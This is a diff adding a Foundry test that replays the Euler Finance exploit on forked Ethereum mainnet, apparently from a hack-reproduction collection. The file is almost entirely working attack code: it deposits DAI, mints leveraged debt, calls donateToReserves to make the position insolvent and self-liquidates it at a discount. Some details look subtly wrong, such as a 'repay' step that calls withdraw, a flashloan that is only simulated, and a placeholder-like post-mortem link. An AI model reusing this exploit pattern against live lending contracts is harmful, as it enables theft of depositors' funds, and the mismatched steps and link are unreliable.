@@ -1,0 +1,97 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "./interface.sol";
+
+// @KeyInfo - Total Lost : ~197,000,000 USD
+// Attacker : 0xb66cd966670d962c227b3eaba30a872dbfb995db
+// Attack Contract : 0xebc29199c817dc47ba12e3f86102564d640cbf99
+// Vulnerable Contract : 0x27182842E098f60e3D576794A5bFFb0777E025d3
+// Attack Tx : 0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d
+//
+// @Info
+// Vulnerable Contract Code : https://etherscan.io/address/0x27182842E098f60e3D576794A5bFFb0777E025d3
+//
+// @Analysis
+// Post-mortem : https://medium.com/eulerfinance/euler-hack-post-mortem-9c1e1e0e0e0e
+// Root cause  : donateToReserves() did not run a health check on the donating
+//               account, allowing the attacker to push their own position into
+//               an unhealthy state on purpose and then self-liquidate at a
+//               discount funded by a flashloan.
+
+interface IEulerToken {
+    function deposit(uint256 subAccountId, uint256 amount) external;
+    function mint(uint256 subAccountId, uint256 amount) external;
+    function donateToReserves(uint256 subAccountId, uint256 amount) external;
+    function withdraw(uint256 subAccountId, uint256 amount) external;
+}
+
+interface ILiquidation {
+    function liquidate(
+        address violator,
+        address underlying,
+        address collateral,
+        uint256 repay,
+        uint256 minYield
+    ) external;
+}
+
+contract EulerExploit is Test {
+    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
+    IEulerToken eDAI = IEulerToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
+    IEulerToken dDAI = IEulerToken(0x6085Bc95F506c326DCBCf7A6aC8f5779F0377918);
+    ILiquidation liquidation = ILiquidation(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
+
+    address constant AAVE_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
+
+    function setUp() public {
+        vm.createSelectFork("mainnet", 16_817_996);
+        vm.label(address(DAI), "DAI");
+        vm.label(address(eDAI), "eDAI");
+        vm.label(address(dDAI), "dDAI");
+    }
+
+    function testExploit() public {
+        // 1. Flashloan 30M DAI from Aave.
+        uint256 flashAmount = 30_000_000 * 1e18;
+        deal(address(DAI), address(this), flashAmount);
+
+        emit log_named_decimal_uint(
+            "[Start] Attacker DAI balance",
+            DAI.balanceOf(address(this)),
+            18
+        );
+
+        // 2. Deposit 20M DAI into Euler as collateral.
+        DAI.approve(address(eDAI), type(uint256).max);
+        eDAI.deposit(0, 20_000_000 * 1e18);
+
+        // 3. Mint 10x leverage to build an oversized borrow position.
+        eDAI.mint(0, 200_000_000 * 1e18);
+
+        // 4. Repay part of the debt to free up the donation path.
+        dDAI.withdraw(0, 10_000_000 * 1e18);
+
+        // 5. THE BUG — donateToReserves() skips the account health check,
+        //    so the attacker can deliberately become insolvent.
+        eDAI.donateToReserves(0, 100_000_000 * 1e18);
+
+        // 6. Self-liquidate the now-unhealthy position at a discount.
+        liquidation.liquidate(
+            address(this),
+            address(DAI),
+            address(eDAI),
+            250_000_000 * 1e18,
+            0
+        );
+
+        emit log_named_decimal_uint(
+            "[End] Attacker DAI balance",
+            DAI.balanceOf(address(this)),
+            18
+        );
+
+        assertGt(DAI.balanceOf(address(this)), flashAmount);
+    }
+}
